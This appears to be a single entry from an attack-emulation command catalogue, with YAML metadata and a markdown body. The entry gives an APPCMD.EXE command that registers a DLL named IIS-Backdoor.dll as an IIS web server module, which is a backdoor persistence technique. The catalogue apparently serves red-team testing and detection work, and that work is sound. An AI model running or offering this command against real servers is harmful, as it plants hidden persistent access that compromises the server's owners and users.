---
id: b14128e8-0e41-4f4d-bf96-68f00fa1d0bf
name: Install IIS-Backdoor module
type: command
executor: bash
data: C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll"
  /add:true
output: null
created_at: '2023-04-06T03:56:27.931476+00:00'
updated_at: '2023-04-10T20:37:21.199886+00:00'
---

# Install IIS-Backdoor module

```bash
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```


